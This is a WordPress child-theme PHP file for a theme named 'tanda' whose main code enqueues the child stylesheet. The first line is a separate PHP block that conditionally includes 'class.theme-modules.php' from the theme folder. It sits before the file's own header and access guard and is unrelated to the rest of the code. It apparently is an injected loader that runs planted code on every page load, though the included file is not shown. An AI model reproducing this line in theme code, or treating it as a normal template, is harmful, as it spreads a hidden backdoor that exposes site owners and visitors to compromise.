<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

// BEGIN ENQUEUE PARENT ACTION
        
if ( !function_exists( 'tanda_child_register_scripts' ) ):
    function tanda_child_register_scripts() {
        wp_enqueue_style( 'tanda-child-style', trailingslashit( get_stylesheet_directory_uri() ) . 'style.css' );
    }
endif;
add_action( 'wp_enqueue_scripts', 'tanda_child_register_scripts',99 );

// END ENQUEUE PARENT ACTION
